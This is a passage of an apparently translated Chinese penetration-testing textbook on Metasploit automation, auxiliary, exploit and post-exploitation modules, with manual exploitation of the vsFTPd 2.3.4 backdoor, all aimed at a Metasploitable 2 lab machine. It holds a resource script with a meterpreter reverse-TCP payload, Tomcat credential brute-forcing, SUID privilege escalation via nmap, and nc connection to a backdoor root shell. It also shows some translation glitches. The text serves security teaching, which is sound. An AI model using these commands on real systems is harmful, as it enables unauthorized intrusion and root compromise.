  \ 自动化\n\nMetasploit 自动化指的是使用脚本或工具来自动执行 Metasploit 模块、命令和利用程序的过程。这种方法通过减少手动工作和避免重复性任务，为渗透测试人员节省了时间和精力，允许更快速地识别和利用漏洞。Metasploit\
  \ 自动化可以通过使用 `Ruby` 或 `Python` 等脚本语言来实现，最简单的方法是使用资源文件 `.rc`。脚本涉及创建一个带有 `.rc` 扩展名的文件，其中包含执行\
  \ Metasploit 模块、命令和利用程序所需的命令和参数。这些脚本可以使用 `msfconsole -r` 命令从命令行执行，该命令会读取脚本文件并执行其中包含的命令。\n\
  \n这是一个用于自动化利用的 Metasploit 资源脚本示例：\n\n```\nuse use exploit/multi/http/php_cgi_arg_injection\n\
  set RHOSTS 192.168.149.129\nset RPORT 80\nset payload php/meterpreter_reverse_tcp\n\
  set LHOST 192.168.149.128\nset LPORT 4444\nexploit\n```\n\n要要保存该脚本，请使用 `[file_name].rc`\
  \ 格式并将其保存到目录。要启动脚本，运行命令 `msfconsole -r [file_name_and_path]`，如图 5.19 所示：\n\n![](img/Figure_5.19.png)\n\
  \n图 5.19: 启动自动化脚本\n\n一旦 Metasploit 框架加载，它将逐条读取并执行资源文件中的指令，并建立反向 meterpreter 会话。从那里，渗透测试人员可以执行任何命令并进行横向移动，如图\
  \ 5.20 所示：\n\n![](img/Figure_5.20.png)\n\n图 5.20: 读取并执行指令\n\n| 注意：使用 Metasploit\
  \ 的脚本语言和资源文件自动化常用任务可以带来许多益处，例如节省时间、减少错误并实现一致且可重复的安全评估。 |\n\n## 从辅助模块和利用程序开始\n\n\
  Metasploit 框架提供了多样化的模块，旨在完成与渗透测试和漏洞评估相关的不同任务。\n\n### 辅助模块 (Auxiliary modules)\n\n\
  辅助模块并不直接利用目标系统中的漏洞，而是协助其他模块执行侦察、扫描、指纹识别和枚举等任务。端口扫描器、暴力破解密码破解器和 HTTP 扫描器是 Metasploit\
  \ 中可以找到的一些辅助模块实例。\n\n### 利用程序模块 (Exploit modules)\n\n利用程序模块利用目标系统中发现的漏洞来获取远程访问或在系统上运行代码。利用程序模块根据它们利用的漏洞类型进行分组，示例包括缓冲区溢出、SQL\
  \ 注入和远程代码执行。\n\n### 后渗透模块 (Post-exploitation modules)\n\n此外，Metasploit 还包含了在利用成功后发挥作用的后渗透模块。这些模块协助维持对目标系统的访问、提升权限或收集有关目标系统的额外数据。\n\
  \n让我们探索一个实际示例来理解辅助模块、利用程序模块和后渗透模块的作用。我们将使用 Metasploitable 2 机器上的 `8010` 端口。以下是涵盖从收集信息到利用漏洞的每步骤指南：\n\
  \n1. 在 Metasploitable 2 IP 上运行 `Nmap` 后，观察到 `8180` 端口开放并正在运行 Tomcat 服务，如图 5.21 所示：\n\
  \n![](img/Figure_5.21.png)\n\n图 5.21: 在 Metasploitable 2 IP 上运行 Nmap\n\n2. 尝试使用\
  \ URL `http://metasploitableIP:8180` 打开 `8180` 上的页面，点击左面板中的任何链接后将提示用户登录，如图 5.22\
  \ 所示：\n\n![](img/Figure_5.22.png)\n\n图 5.22: 打开 8180 上的页面\n\n3. 为了获取登录凭据，可以使用 `msf`\
  \ 中的 `auxiliary/scanner/http/tomcat_mgr_login` 辅助模块并执行所需的命令，如图 5.23 所示：\n\n![](img/Figure_5.23.png)\n\
  \n图 5.23: 获取登录凭据\n\n4. 成功运行将显示登录凭据，如图 5.24 所示：\n\n![](img/Figure_5.24.png)\n\n图\
  \ 5.24: 登录凭据\n\n5. 发现凭据后，登录并导航到“列应用程序”（List Applications）选项卡。在这里，你会找到各种上传文件的选项。你可以尝试使用\
  \ `msfconsole` 上可用的利用程序来利用上传漏洞，或使用 `msfvenom` 创建新的利用程序。参见图 5.25：\n\n![](img/Figure_5.25.png)\n\
  \n图 5.25: 使用发现的凭据登录\n\n6. 对于利用，可以使用 `exploit/multi/http/tomcat_mgr_deploy` 模块。你必须确保将\
  \ manager 的用户名和密码同从辅助扫描中获得的其他选项一起进行设置，如图 5.26 所示：\n\n![](img/Figure_5.26.png)\n\n\
  图 5.26: 配置并运行利用程序\n\n7. 现在，我们得到了 meterpreter 会话，但它并没有授予 root 级访问，如图 5.27 所示：\n\n\
  ![](img/Figure_5.27.png)\n\n图 5.27: Meterpreter 会话\n\n8. 为了提升权限并成为 root 用户，你可以尝试利用任何可用的设置了用户\
  \ ID (SUID) 的二进制文件。然而，在运行任何命令之前，你应该通过执行图 5.28 所示的命令从 meterpreter 进入 shell：\n\n![](img/Figure_5.28.png)\n\
  \n图 5.28: 来自 meterpreter 的 shell\n\n9. 然后运行 `find / -type f -perm -4000 2>/dev/null`\
  \ 命令搜索任何设置了 SUID 位的二进制文件。将显示许多设置了 SUID 位的二进制文件，如图 5.29 所示：\n\n![](img/Figure_5.29.png)\n\
  \n图 5.29: 搜索任何带有 SUID 位的二进制文件\n\n10. 使用 `Nmap`，你可以执行权限提升并成为 root 用户。运行命令 `nmap --interactive`，如图\
  \ 5.30 所示：\n\n![](img/Figure_5.30.png)\n\n图 5.30: 权限提升\n\n\n\n\n\n# 11. 在获取 Metasploitable\
  \ 2 的 root 权限后，用户可以进行各种横向移动来实现其目标，如图图 5.31\n\n图 5.31：横向移动\n\n| 注意：总之，Metasploit\
  \ 包含多种类型的模块，包括用于辅助任务的 Auxiliary 模块、用于利用漏洞的 Exploit 模块，以及在成功利用漏洞后执行任务的 Post-exploitation\
  \ 模块。 |\n\n## 手动利用\n\n不使用 Metasploit 而利用漏洞需要高级技术知识，以及对目标系统和被利用漏洞的深度理解。一种常用方法是使用\
  \ Python 或 C 等编程语言编写自定义利用代码。另一种方法是使用公开的利用程序或脚本，对其进行修改以适应目标系统和漏洞。\n\n要利用 Metasploitable\
  \ 2 机器上的 vsFTPd 服务，我们将使用 `telnet` 并触发现有后门以获取反向 shell 访问。按照以下步骤操作：\n\n1. 在终端中运行命令\
  \ `telnet <Metasploitable 2 的 IP 地址> 21`，如图图 5.32\n\n    图 5.32：运行 telnet\n\n2.\
  \ 输入 `USER random string` 后跟一个笑脸 `:)` 来输入凭据，然后输入 `PASS another random string` 并按回车。要退出\
  \ `telnet`，按 `Ctrl + ]` 然后按回车，如图图 5.33\n\n    图 5.33：输入凭据\n\n3. 一旦成功利用 vsFTPd 2.3.4，将创建一个绑定到端口\
  \ 6200 的 shell 且具有 root 权限。要连接到该 shell，运行命令 `nc <Metasploitable 2 的 IP 地址> 6200`，如图图\
  \ 5.34\n\n    图 5.34：连接端口 6200 上的 shell\n\n| 注意：需要注意的是，字符串 `:)` 对于成功利用 vsFTPd 版本\
  \ 2.3.4 的漏洞起着至关重要的作用。此版本的 vsFTPd 包含 2011 年引入的后门。后门代码设计用于搜索用户在 FTP 服务器登录过程中输入的特定字符串。如果后门按正确的顺序找到笑脸字符，它将触发一个名为\
  \ `vsf_sysutil_extra();` 的函数，打开一个具有 root 权限的 shell。 |\n\n## 使用 Armitage 进行利用\n\n\
  Armitage 是一种用户友好的网络攻击管理工具，简化了在目标系统上创建和执行攻击的过程。它为流行的开源 Metasploit 框架提供了一个可视化界面，该框架广泛用于渗透测试和漏洞评估。\n\
  \nArmitage 为安全专业人员提供了启动预构建的 Metasploit 模块或自定义攻击以满足需求的能力。它还包含了协作、报告和跟踪攻击进度的功能，因此成为伦理黑客不可或缺的资产。此外，该工具的视觉界面简化了映射网络和识别潜在攻击目标的过程。\n\
  \n### 设置 Armitage\n\n以下是在 Kali Linux 中设置 Armitage 的逐步方法：\n\n1. 在终端中运行命令 `sudo apt-get\
  \ install armitage` 安装 Armitage，如图图 5.35\n\n    图 5.35：安装 Armitage\n\n2. 在终端中运行命令\
  \ `sudo service postgresql start` 启动 PostgreSQL 服务器，如图图 5.36\n\n    图 5.36：启动 PostgreSQL\
